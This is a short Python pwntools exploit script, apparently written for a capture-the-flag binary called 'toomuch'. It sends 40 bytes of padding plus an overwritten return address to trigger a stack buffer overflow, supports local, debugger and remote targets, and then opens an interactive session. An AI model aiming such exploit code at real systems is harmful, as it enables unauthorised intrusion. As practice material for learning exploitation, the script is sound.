#!/usr/bin/env python3
import sys
import string
from pwn import *


#context.arch=""
context.log_level = "debug"

context.log_level = 'debug'
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-v"]
bRemote = False
filename = ''


if len(sys.argv) == 1:
    exe = "./toomuch"
    elf = context.binary = ELF( exe, checksec=False )
    p = process( exe )
elif len(sys.argv) == 2:
    exe = "./toomuch"
    elf = context.binary = ELF( exe, checksec=False )
    p = gdb.debug( exe, '''
    break *0x4012cc
    continue
    ''')
elif len(sys.argv) >= 3:
    p = remote( sys.argv[1], sys.argv[2] )
    bRemote = True
    if len(sys.argv) >= 4:
        filename = sys.argv[3]
    if len(sys.argv) >= 5:
        offset = int(sys.argv[4])
else:
    print( "./exp.py  => Launch process \n./exp.py 1 => Launch GDB\n./exp.py <IP> <PORT>")


def debug(p):
    gdb.attach(p,'''
        bt
    ''')


ret = p.recvuntil(b'Buffer: ')
print(ret)
#c = cyclic(0x40)
#c = cyclic(44)
#print(c)
c = b"0"*40 + p32(0x4011d5)
p.sendline(c+b"\x00\x00\x00\x00")
print("exit")
p.interactive()
